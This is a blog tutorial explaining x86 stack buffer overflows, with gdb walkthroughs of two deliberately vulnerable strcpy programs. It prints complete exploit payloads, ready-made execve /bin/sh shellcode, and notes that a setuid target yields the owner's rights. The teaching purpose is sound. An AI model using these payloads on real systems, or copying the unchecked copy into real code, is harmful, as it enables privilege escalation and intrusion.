---
title: "Buffer Overflow"
date: 2015-03-04
author: "Pixis"
layout: post
permalink: /buffer-overflow/
disqus_identifier: 1000-0000-0000-000B
description: "In this article we are going to explain what a buffer overflow his. We will then give two exploitation examples in this "buffer overflow" tutorial"
cover: assets/uploads/2015/03/groot.jpg
tags:
  - "User Land"
  - Linux
---

In this article we are going to explain what a buffer overflow his. We will then give two exploitation examples in this "buffer overflow" tutorial :

  1. When the buffer is large enough to contain a shellcode before the stack return address
  2. When the buffer is too small to contain a shellcode before the stack return address

<!--more-->

## Theory

We saw the stack utility in the previous articles. At the end, we talked about the case where a function needed to allocate space on the stack for a variable which was an array.

```c
void myFunction(char *aString) {
    char array[24];
}
```

We got the following schematic representing the stack :

[![Stack](/assets/uploads/2015/03/stack1.png)](/assets/uploads/2015/03/stack1.png)

Very good. Now, if we allocate a char array to this local variable with the following :

```c
void myFunction(char *aString) {
    char array[24];
    strcpy(array, aString);
}
```

Then `aString` will be paste in the allocated space in the stack, starting from the address pointed by `ESP` then going down in the stack (so from low addresses to high addresses, or form the top of the stack to the bottom of it). We will take the example of a String full of `"A"` which length is shorter than 24 bytes :

[![Stack](/assets/uploads/2015/03/stack2.png)](/assets/uploads/2015/03/stack2.png)

Everything is fine, but you are probably asking yourself : Hey, but what if I put more char than the limit ?

[![Stack](/assets/uploads/2015/03/stack3.png)](/assets/uploads/2015/03/stack3.png)

What a shame... for the developer. But for us, this is where the fun begins ! Did you find out how ?

We manage to write on the return value that the CPU retrieves at the end of the function. In the current state, he will try to go to the `AAAA` address which we write `0x41414141` in hexadecimal. There is a high probability that he does not have the right to access this memory address, or that this memory section is not mapped, and you will probably get a beautiful `SEGFAULT`.

But that means that we can write any value. We could redirect the execution flow of this program to a piece of code that we wrote. This piece of code could open a shell for example.

So get you keyboards ready, let's exploit this...

## Practice

As promised, we will see two different cases.

### Case 1

I made a video with a similar case. You can [find it here](https://www.youtube.com/watch?v=V7Gdc32XRhA){:target="blank"}. (The video is in french).

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func(char *arg)
{
    char buffer[64];
    strcpy(buffer,arg);
    printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
    if(argc != 2) printf("binary \n");
    else func(argv[1]);
    return 0;
}
```

Here we have a program which takes an argument to run (which will be a string, or more precisely an array of chars). The argument is passed to the `func` function. This function then allocated 64 bytes on the stack. This memory space is pointed at by the `buffer` pointer. The program then copy the content of our string in this `buffer`, without any verification on the size of the string, and finally display our `buffer` content.

Great ! Let's compile and run it :

```bash
hackndo@hackndo:~$ gcc binary.c -o binary

hackndo@hackndo:~$ ./binary AAA

AAA

hackndo@hackndo:~$ ./binary $(perl -e 'print "A"x200')

AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Segmentation fault

hackndo@hackndo:~$
```

After the compilation, we firstly run our program with the string `AAA` as the parameter. It is then display to us correctly as expected. In the second case, we sent the letter `"A"` 200 times. Our program also displays it but we got a segmentation fault (`SEGFAULT`). This means that we tried to read a memory segment where we didn't had the right to read (or write where we didn't had the right to write).

Let's try to understand what's going on. We are going to follow step by step how our program is running. There are the assembly instructions of both functions :

```bash
# Function main
(gdb) disass main
Dump of assembler code for function main:
0x08048419 <+0>:     push   ebp
0x0804841a <+1>:     mov    ebp,esp
0x0804841c <+3>:     and    esp,0xfffffff0
0x0804841f <+6>:     sub    esp,0x10
0x08048422 <+9>:     cmp    DWORD PTR [ebp+0x8],0x2
0x08048426 <+13>:    je     0x8048436 <main+29>
0x08048428 <+15>:    mov    DWORD PTR [esp],0x8048510
0x0804842f <+22>:    call   0x8048330 <puts@plt>
0x08048434 <+27>:    jmp    0x8048446 <main+45>
0x08048436 <+29>:    mov    eax,DWORD PTR [ebp+0xc]
0x08048439 <+32>:    add    eax,0x4
0x0804843c <+35>:    mov    eax,DWORD PTR [eax]
0x0804843e <+37>:    mov    DWORD PTR [esp],eax
0x08048441 <+40>:    call   0x80483f4
0x08048446 <+45>:    mov    eax,0x0
0x0804844b <+50>:    leave
0x0804844c <+51>:    ret
End of assembler dump.

# Function func
(gdb) disass func
Dump of assembler code for function func:
0x080483f4 <+0>:     push   ebp
0x080483f5 <+1>:     mov    ebp,esp
0x080483f7 <+3>:     sub    esp,0x58
0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
0x080483fd <+9>:     mov    DWORD PTR [esp+0x4],eax
0x08048401 <+13>:    lea    eax,[ebp-0x3a]
0x08048404 <+16>:    mov    DWORD PTR [esp],eax
0x08048407 <+19>:    call   0x8048320 <strcpy@plt>
0x0804840c <+24>:    lea    eax,[ebp-0x3a]
0x0804840f <+27>:    mov    DWORD PTR [esp],eax
0x08048412 <+30>:    call   0x8048330 <puts@plt>
0x08048417 <+35>:    leave
0x08048418 <+36>:    ret
End of assembler dump.
```

The first part of this code is our `main` function and the second part is our `func` function. The call to the `func` function is done at the `0x08048441` address of the `main` function. As we enter in `func`, the third line is our buffer allocation. `0x58` (88 in hexadecimal) bytes are allocated (you probably noticed that it is more than the 64 bytes we asked in our code because the alignment of the variables in memory must be taken into account. That's a subject we won't discuss here, it would be the subject of a full article.).

Next, at `0x08048407` address is the system call to copy the variable's content into the buffer. The `0x08048412` instruction calls `puts` which allow to display a char array to the standard output. We finally have the return instruction at the `0x08048418` address.

In order to be able to follow the execution of the code, we will place breakpoints in strategic places so that I can make you understand how it works. You'll understand why these places are interesting, because at each breakpoints I'll explain its contribution to the code.

```bash
(gdb) break *0x08048441 # Before func, in main
Breakpoint 1 at 0x8048441
(gdb) break *0x080483f7 # Before memory allocation for the buffer
Breakpoint 2 at 0x80483f7
(gdb) break *0x080483fa # After memory allocation for the buffer
Breakpoint 3 at 0x80483fa
(gdb) break *0x0804840c # After copying the variable in the buffer
Breakpoint 4 at 0x804840c
(gdb) break *0x08048418 # Before returning from the function
Breakpoint 5 at 0x8048418
```

* The **first** breakpoint is placed just before the `func` call in `main`. We could see how this call is done, in particular how the argument we are passing on to the program is stacked up.
* The **second** one is placed before the memory allocation into the buffer. Here, we will see how the `func` function is preparing it stackframe by recording the old EBP value, and by initializing it for it's own stackframe.
* The **third** is placed just after this memory allocation in order to see how the processor reserves memory space for the buffer.
* The **fourth** is placed after copying the variable into the buffer, thus allowing us to observe how the buffer is filling up with the argument that we passed to him, with the `strcpy` function.
* The **fifth** is placed before exiting the function so we can see that the printf don't have any problem displaying our string.

Let's go, it's time for us to execute this code. For this, I will send an argument of length 78. There is a good reason, and you will understand it in the course of this example.

```bash
(gdb) run `perl -e 'print "A"x78'`
Starting program: /tmp/hackndo/binary `perl -e 'print "A"x78'`
Breakpoint 1, 0x08048441 in main ()

(gdb) disass main
Dump of assembler code for function main:
   0x08048419 <+0>:     push   ebp
   0x0804841a <+1>:     mov    ebp,esp
   0x0804841c <+3>:     and    esp,0xfffffff0
   0x0804841f <+6>:     sub    esp,0x10
   0x08048422 <+9>:     cmp    DWORD PTR [ebp+0x8],0x2
   0x08048426 <+13>:    je     0x8048436 <main+29>
   0x08048428 <+15>:    mov    DWORD PTR [esp],0x8048510
   0x0804842f <+22>:    call   0x8048330 <puts@plt>
   0x08048434 <+27>:    jmp    0x8048446 <main+45>
   0x08048436 <+29>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048439 <+32>:    add    eax,0x4
   0x0804843c <+35>:    mov    eax,DWORD PTR [eax]
   0x0804843e <+37>:    mov    DWORD PTR [esp],eax
=> 0x08048441 <+40>:    call   0x80483f4
   0x08048446 <+45>:    mov    eax,0x0
   0x0804844b <+50>:    leave
   0x0804844c <+51>:    ret
End of assembler dump.

# We display the state of the three registers
(gdb) i r $eip $esp $ebp
eip            0x8048441     0x8048441 <main+40>
esp            0xbffffc50    0xbffffc50
ebp            0xbffffc68    0xbffffc68

# We examine the value contained by ESP
(gdb) x/xw $esp
0xbffffc50:    0xbffffe35

# We're looking at the content of ESP
(gdb) x/s 0xbffffe35
0xbffffe35:     'A'
```

Great, we can see where we are in the execution flow thanks to the `disass main` command. We are just before the call to `func`. So logically, the element at the top of the stack should be the pointer to the character string that we passed in argument.

By displaying the different registers that we are interested in with the abbreviated command `info registers`, we can see that the top of the stack is located at the address pointed by `ESP`, that is `0xbffffc50`.

If we look at the address here, with the command `x/xw $esp`, we get the address that point to our string, `0xbffffe35`. Indeed if we  display the String located at the memory address, gdb returns that it is a repetition of 78 times the character `"A"`.

Having placed the breakpoint on the instruction at the `0x08048441` address, it has not been executed, but it will be the next one, that explain why `EIP` have this address as value.

Finally, we can see that the start of the `main` function stackframe is located at the address within `EBP`, i.e. `0xbffffc68`.

Ok, everything is looking good, let's move on !

```bash
(gdb) continue
Continuing.
Breakpoint 2, 0x080483f7 in func ()

(gdb) disass func
Dump of assembler code for function func:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
=> 0x080483f7 <+3>:     sub    esp,0x58
   0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x08048401 <+13>:    lea    eax,[ebp-0x48]
   0x08048404 <+16>:    mov    DWORD PTR [esp],eax
   0x08048407 <+19>:    call   0x8048320 <strcpy@plt>
   0x0804840c <+24>:    lea    eax,[ebp-0x48]
   0x0804840f <+27>:    mov    DWORD PTR [esp],eax
   0x08048412 <+30>:    call   0x8048330 <puts@plt>
   0x08048417 <+35>:    leave
   0x08048418 <+36>:    ret
End of assembler dump.

(gdb) i r $eip $esp $ebp
eip            0x80483f7    0x80483f7 <func+3>
esp            0xbffffc48    0xbffffc48
ebp            0xbffffc48    0xbffffc48

(gdb) x/4xw $esp
0xbffffc48:    0xbffffc68    0x08048446    0xbffffe35    0xb7ff1380
```

One more times, we can see where we are in the execution flow of our program. If you are still following, you should be able to guess what's at the top of the stack, and the purpose of the next instruction to be executed.

As we entered the function, the processor already recorded the `EIP` register that was running at the time of the call, i.e. the address `0x08048446`.

Then, the beginning of the function wanting to have his own stackframe record the beginning of the stackframe of the calling function with the `push ebp` instruction. It then initialize the beginning of his own stackframe by copying the value of `ESP` into `EBP` (`mov ebp,esp`).

I displayed the three registers values, and when we are displaying the 4 values that are on top of the stack, we find unsurprisingly the last value added which is the previous value of `EBP` (that we found before the function call, that was the stackframe base of the `main` function), followed by the save of `EIP`, instruction address that follows the `call` to the `func` function.

Let's continue !

```bash
(gdb) continue
Continuing.
Breakpoint 3, 0x080483fa in func ()

(gdb) disass func
Dump of assembler code for function func:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x58
=> 0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x08048401 <+13>:    lea    eax,[ebp-0x48]
   0x08048404 <+16>:    mov    DWORD PTR [esp],eax
   0x08048407 <+19>:    call   0x8048320 <strcpy@plt>
   0x0804840c <+24>:    lea    eax,[ebp-0x48]
   0x0804840f <+27>:    mov    DWORD PTR [esp],eax
   0x08048412 <+30>:    call   0x8048330 <puts@plt>
   0x08048417 <+35>:    leave
   0x08048418 <+36>:    ret
End of assembler dump.

(gdb) i r $eip $esp $ebp
eip            0x80483fa    0x80483fa <func+6>
esp            0xbffffbf0    0xbffffbf0
ebp            0xbffffc48    0xbffffc48
```

We have advanced only one instruction, but it's a really important one. It's this instruction that allocate the memory space required by the buffer, as well as for the variables that it will need to add to the stack, such as the address of our string that will be passed at the `strcpy` system call. The assembly instruction remove `0x58` (88) bytes at the address contained in `ESP`. In other words, it shift the top of the stack and make it grow by 88 bytes.

At the line `+6`,

```text
=> 0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
```

The instruction is looking for the memory address which is at the `EBP+8` address, then assign the content pointed by this address to `EAX`. We know the `EBP` is pointing at the stackframe base of the function. So `EBP+4` is the backup of `EIP`, and `EBP+8` is the address of the pointer on our character string. So `EAX` will contain the address of our string,

The next line, `+9`, copy the content of `EAX` (so the address of our string), into `ESP+4`, that is in the memory case just before the top of the stack.

Finally, the instructions on lines `+13` and `+16` put the address of the beginning of the buffer on top of the stack, which is at `EBP - 0x48`. The buffer that will be allocated then have a size of `EBP - (EBP - 0x48) = 0x48` bytes (meaning 72 bytes).

It doesn't matter what those 72 bytes are since they won't be read until the buffer is filled with content.

Did you follow? Come on, how nice of me, I made a nice diagram to understand the state of the stack just before calling `strcpy` to summarize the current state.

[![Stack](/assets/uploads/2015/03/stack4.png)](/assets/uploads/2015/03/stack4.png)

Is that a little clearer? Try to resume my explanations with this diagram in mind, it will surely be easier to come back to it a second time.

A bit of mathematics shows that we finally have an offset of 88 bytes, which means that there is an offset of 22 `quadri-bytes` called `dword` (the size of an address). So if we have an offset of 22 `dwords`, and we are showing the first 24 items in the stack, we should fall back on our feet and find our backup of `EBP` and `EIP` in the last positions.

```bash
(gdb) x/24xw $esp
0xbffffbf0:    0xb7fffa54    0x00000000    0xb7fe1b48    0x00000001
0xbffffc00:    0x00000000    0x00000001    0xb7fff8f8    0xb7fd6ff4
0xbffffc10:    0xb7f983e9    0xb7ec40f5    0xbffffc28    0xb7eabab5
0xbffffc20:    0xb7fd6ff4    0x0804960c    0xbffffc38    0x080482ec
0xbffffc30:    0xb7ff1380    0x0804960c    0xbffffc68    0x08048479
0xbffffc40:    0xb7fd7324    0xb7fd6ff4    0xbffffc68    0x08048446
#                                            ^^^^^^^^      ^^^^^^^^
#                                              sEBP          sEIP
```

And that is the case ! The end of the last line, indeed, contain both addresses `sEBP` and `sEIP`. The above 72 bytes are for the buffer, and the first 16 bytes are for the call to `strcpy`.

```bash
(gdb) c
Continuing.

Breakpoint 4, 0x0804840c in func ()

(gdb) disass func
Dump of assembler code for function func:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x58
   0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x08048401 <+13>:    lea    eax,[ebp-0x48]
   0x08048404 <+16>:    mov    DWORD PTR [esp],eax
   0x08048407 <+19>:    call   0x8048320 <strcpy@plt>
=> 0x0804840c <+24>:    lea    eax,[ebp-0x48]
   0x0804840f <+27>:    mov    DWORD PTR [esp],eax
   0x08048412 <+30>:    call   0x8048330 <puts@plt>
   0x08048417 <+35>:    leave
   0x08048418 <+36>:    ret
End of assembler dump.

(gdb) i r $eip $esp $ebp
eip            0x804840c    0x804840c <func+24>
esp            0xbffffbf0    0xbffffbf0
ebp            0xbffffc48    0xbffffc48

(gdb) x/24xw $esp
0xbffffbf0:    0xbffffc00    0xbffffe35    0xb7fe1b48    0x00000001
0xbffffc00:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc10:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc20:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc30:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc40:    0x41414141    0x41414141    0x41414141    0x08004141
#                                            ^^^^^^^^      ^^^^^^^^
#                                       overwritten EBP  overwritten EIP
```

So we continue, and break on the instruction that follows the system call `strcpy`, which copies the content of the variable that we passed as an argument (the `A`'s) into the buffer.

As we can see on the stack, the first two elements are both parameters that we passed to strcpy. `0xbffffc00` is the start address of the buffer, which is indeed the beginning of the `0x41`'s, the second one is the address of our char string in memory, as we saw at the beginning.

But remember, we only planned a 64 bytes buffer, and we gave him 78 ! That could be a problem. So we check the top of the stack like at the previous breakpoint, and we notice that all the space allocated to the buffer has been filled... and it has even **overflowed** ! The save of `EBP` as been overwritten by our `"A"`'s (represented by their ASCII value `0x41`), and our `EIP` record, here called `sEIP` has been partially rewritten. It became `0x08004141`. Since the notation is in Little Endian, memory cases are in fact : `0x41` `0x41` `0x00` `0x08`. So we have last two `"A"`'s of our variable, followed by the null byte which marks the end of a string.

If this buffer overflow does not disturb the CPU for the moment, it will be annoyed when it has to use the saved value of `EIP` in order to resume execution.

```bash
(gdb) continue
Continuing.
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 5, 0x08048418 in func ()
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()

```

There we go. The processor succeed to display the entire string, stopping at the null byte, but when it wanted to reuse the saved version of `EIP`, it came across the address `0x08004141`. And unfortunately, it is not allowed to access this memory address. The `SEGFAULT` is inevitable !

As we said in the theoretical part, we can rewrite the value stored in `EIP` in order to redirect our program execution flow. But where to redirect this execution ? Well why not at the beginning of a shellcode ? A shellcode is a string of characters that represents a sequence of machine instructions that, when executed, will open a shell (The term shellcode has become a little more generic, since it now refers to any string of machine instructions).

We could describe here how to write a shellcode, but that is not the purpose of this article. More advanced notions of assembler are needed and if we wanted to cover every aspect of this subject, an article would not be enough. That's why we will take a ready-made shellcode, available on the internet, working on an x86 architecture :

> \xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

Simply put, this instruction sequence executes the `execve` system call, passing the string `"/bin/sh"` as an argument, and then makes a call to the `exit` system call.

This sequence of instruction must therefore be executed by the program. The number of bytes necessary to store this sequence is 45 bytes (38 characters in the form \x?? and the 7 printable characters `/`, `b`, `i`, `n`, `/`, `s`, `h`.)

And here's how to put it all :

[![img_54f78559832ab](/assets/uploads/2015/03/img_54f78559832ab.png)](/assets/uploads/2015/03/img_54f78559832ab.png)

Here we have a horizontal representation of the stack. On the left, we have the top of the stack, and the more we go to the right, the more we are going down in the stack. When `strcpy` writes in the buffer, it writes from the left to the right, until overwriting the saves `EBP` and then `EIP`.

  * Then fill the **first part** of the buffer with the `\x90` instruction. In assembly, this instruction means **don't do anything with me, just go to the next instruction** This is the `NOP` (No OPeration).
  * The **second part** of the buffer contains the shellcode, which we wants the program to execute.
  * The **third part** contains the address that we control.

We will make the program drop in the first part, the `NOP` pool. Indeed, if we fall in the middle of the NOPs, then the program will go to the next instruction, which is a NOP, and so on until it reaches the shellcode, and will execute it in its entirety. It is only a way to make the execution of the shell code simpler, since any address in the NOPs will do.

To find out how many `NOPs` are possible , we have to do a little calculation :

We saw earlier that the buffer size allocated by `strcpy` was 72 bytes. But in order to overwrite the `EIP` save, we must first overwrite the save of `EBP`, so 4 more bytes, which is 76 bytes.

This means that if we write 76 bytes, then we will have overwritten everything up to `EIP`, `EIP` not included.

If we write two more bytes (78, as in the example), then two bytes of EIP will be overwritten (more like 3, if we take the null character at the end of the string). I had done this upstream for the example, that's why I had chosen 78 bytes !

These characters must end with the shellcode (it's not mandatory, but it's the most convenient!). But we said that the shellcode was 45 bytes long. So we have to insert 76 - 45 = 31 `NOP`, meaning 31 times the value `\x90`.

Finally, to find the address that will overwrite the EIP backup, let's remember the state of the stack :

```bash
(gdb) x/24xw $esp
0xbffffbf0:    0xbffffc00    0xbffffe35    0xb7fe1b48    0x00000001
0xbffffc00:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc10:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc20:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc30:    0x41414141    0x41414141    0x41414141    0x41414141
0xbffffc40:    0x41414141    0x41414141    0x41414141    0x08004141
```

The NOPs will therefore be between `0xbffffc00` and `0xbffffc00 + 31 = 0xbffffc1f`. To make sure that we will fall into, let's take the address `0xbffffc10`.

Finally, we will send :

  * 31 x NOP
  * Shellcode
  * 0xbffffc10

We can write this in Perl in the following way (for the address, don't forget the Little Endian notation).

```perl
print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"
```

By running it in gdb, we get the following result :

```bash
(gdb) run `perl -e 'print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"'`
Starting program: /tmp/hackndo/binary `perl -e 'print "\x90"x31 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x10\xfc\xff\xbf"'`
��������������������������������^�1�F�F
                                       �
                                        ���V
                                             ̀1ۉ�@̀�����/bin/sh���
process 20353 is executing new program: /bin/dash

$
```

Here we go, we used the vulnerability to open a shell. If the binary is suid, this shell will have the rights of the binary owner when the vulnerability is exploited outside gdb.

Did you follow it all the way here? Good job!

* * *

### Case 2

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void func(char *arg)
{
    char buffer[8];
    strcpy(buffer,arg);
    printf("%s\n", buffer);
}

int main(int argc, char *argv[])
{
    if(argc != 2) printf("binary \n");
    else func(argv[1]);
    return 0;
}
```

This program is almost similar to the previous one, however this time the size allocated to the buffer is 8 bytes only. Because of this, there is not enough space to inject our shellcode into it.

To be sure, let's take a look at the assembly code of this program :

```bash
(gdb) disass main
Dump of assembler code for function main:
   0x08048419 <+0>:     push   ebp
   0x0804841a <+1>:     mov    ebp,esp
   0x0804841c <+3>:     and    esp,0xfffffff0
   0x0804841f <+6>:     sub    esp,0x10
   0x08048422 <+9>:     cmp    DWORD PTR [ebp+0x8],0x2
   0x08048426 <+13>:    je     0x8048436 <main+29>
   0x08048428 <+15>:    mov    DWORD PTR [esp],0x8048510
   0x0804842f <+22>:    call   0x8048330 <puts@plt>
   0x08048434 <+27>:    jmp    0x8048446 <main+45>
   0x08048436 <+29>:    mov    eax,DWORD PTR [ebp+0xc]
   0x08048439 <+32>:    add    eax,0x4
   0x0804843c <+35>:    mov    eax,DWORD PTR [eax]
   0x0804843e <+37>:    mov    DWORD PTR [esp],eax
   0x08048441 <+40>:    call   0x80483f4
   0x08048446 <+45>:    mov    eax,0x0
   0x0804844b <+50>:    leave
   0x0804844c <+51>:    ret
End of assembler dump.

(gdb) disass func
Dump of assembler code for function func:
   0x080483f4 <+0>:     push   ebp
   0x080483f5 <+1>:     mov    ebp,esp
   0x080483f7 <+3>:     sub    esp,0x28
   0x080483fa <+6>:     mov    eax,DWORD PTR [ebp+0x8]
   0x080483fd <+9>:     mov    DWORD PTR [esp+0x4],eax
   0x08048401 <+13>:    lea    eax,[ebp-0x10]
   0x08048404 <+16>:    mov    DWORD PTR [esp],eax
   0x08048407 <+19>:    call   0x8048320 <strcpy@plt>
   0x0804840c <+24>:    lea    eax,[ebp-0x10]
   0x0804840f <+27>:    mov    DWORD PTR [esp],eax
   0x08048412 <+30>:    call   0x8048330 <puts@plt>
   0x08048417 <+35>:    leave
   0x08048418 <+36>:    ret
End of assembler dump.
(gdb)
```

It's exactly the same as case 1, except that this time, in the `func` assembly code, we notice that the actual space allocated for our buffer is `0x10` (16) bytes. Since our shellcode is 54 bytes long, we won't be able to inject it here.

The simplest thing to do then is to do exactly the same thing as in the first case, except that this time we will inject our shellcode **after** the save of EIP, as shown in the following figure :

[![img_54f78478da290](/assets/uploads/2015/03/img_54f78478da290.png)](/assets/uploads/2015/03/img_54f78478da290.png)

The `NOP` (`\x90`) pool is only here to make it easier, it is not necessary. Aiming for a range of 200 `NOP` is easier than aiming for the exact start address of the shellcode. However, we are still going to do it without, otherwise it would be too simple !

The first steps of case 1 are still valid. Let's do our little math again. We can see in the assembly instructions that 0x10 bytes (so 16) are allocated for the buffer for `strcpy`. If we add the size of `EBP`, that makes 20 bytes. We can verify this calculation simply by sending a 22 characters long string, and checking that `EIP` as been overwritten halfway :

```bash
(gdb) run `perl -e 'print "A"x22'`
Starting program: /tmp/hackndo/binary `perl -e 'print "A"x22'`
AAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x08004141 in ?? ()
(gdb)
```

We can see that the program tried to access the memory address 0x08004141. So the last two characters of our string overflow on the `EIP` save. So there are two characters overflowing, which makes 20 bytes before overwriting `EIP` as we planned (not counting the null byte). So for our payload we need :

  * 20 characters (no matter which ones)
  * The address following the one at which EIP is saved
  * (The NOP pool, but we'll do without)
  * The shellcode

[![img_54f78d2d9a419](/assets/uploads/2015/03/img_54f78d2d9a419.png)](/assets/uploads/2015/03/img_54f78d2d9a419.png)

To find out the address of the `EIP` save (and thus the address that follows), let's put a breakpoint right after that `EIP` is pushed on the stack, i.e. at the first `func` instruction and look at the value of `ESP`.

```bash
(gdb) break *0x080483f4
Breakpoint 1 at 0x80483f4
(gdb) run `perl -e 'print "A"x69'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/hackndo/binary A

Breakpoint 1, 0x080483f4 in func ()

(gdb) i r $esp
esp            0xbffffc4c    0xbffffc4c

(gdb) x/4xw $esp
0xbffffc4c:    0x08048446    0xbffffe81    0xb7ff1380    0x0804846b

(gdb)
```

_But why run `run` whith 69 `"A"`, instead of running `run` without any argument ?_

It is important to ask ourselves this question. Indeed, we are looking for a precise address of a variable on the stack. It is important de pass 69 `"A"` as argument because it is the total length of our payload that we will send to exploit the buffer overflow (20 bytes containing the buffer and `EBP + 4` bytes for overwriting `EIP + 45` bytes of shellcode ). Now, before the stack are the environment variables and program arguments (including the program name).

[![img_54f81318e37b8](/assets/uploads/2015/03/img_54f81318e37b8.png)](/assets/uploads/2015/03/img_54f81318e37b8.png)

So if we modify the size of the arguments passed to the program, it will shift the stack, so the addresses we are looking for. This is why it is essential to stay in the same execution context, by sending an argument that is always the same size, either during our research or during our exploitation.

That being said, let's go back to the result of our breakpoint : `ESP` has the value `0xbffffc4c`, and we check that at this address is `0x08048446`, which is the saved value of `EIP` (since it is the instruction address following the `call` of `func`). So we'll have to point this `EIP` backup to the following address, which will contain our shellcode, i.e. the address `0xbffffc50`.

So we have our payload, which, in perl, looks like this :

```perl
print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
```

So in gdb, we type :

```bash
(gdb) run `perl -e 'print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`

Starting program: /tmp/hackndo/binary `perl -e 'print "A"x20 . "\x50\xfc\xff\xbf" . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'`
AAAAAAAAAAAAAAAAAAAAP����^�1�F�F
                                �
                                 ���V
                                      ̀1ۉ�@̀�����/bin/sh
process 21429 is executing new program: /bin/dash
$
```

There we go, we also manage to pop a shell with the binary by exploiting a buffer overflow.

I also made a video with a buffer overflow exploitation as in case 1, we can [find it here](https://www.youtube.com/watch?v=V7Gdc32XRhA){:target="blank"}. (The video is in french)

I hope this article **buffer overflow tutorial** has been helpful. However, there are some protections against this type of exploitation, such as making the stack non-executable. At this point, no panic, you can still get a shell, with, for example, the [return to libc](/retour-a-la-libc/) technique. Have fun !

Feel free to comment and share if you liked it!
